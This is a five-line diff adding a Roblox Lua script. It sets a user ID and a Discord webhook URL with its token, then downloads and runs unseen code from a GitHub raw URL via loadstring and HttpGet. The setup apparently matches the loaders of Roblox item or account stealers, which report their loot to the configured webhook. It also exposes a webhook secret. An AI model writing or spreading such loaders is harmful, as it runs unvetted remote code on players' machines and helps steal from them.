@@ -1,0 +1,5 @@
+
+_G.UserID = 8022487302 -- change to your own roblox user id
+_G.webhook = "https://discord.com/api/webhooks/1296771170414366755/dkDqCOM80hdo6NpdX-ycOd4svw9g90xS0tNKP9aKKvXP5KTqHTVYgtuwo7aGqJ7RFOkW" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xymatekidd/Idk/refs/heads/main/hahahha"))()
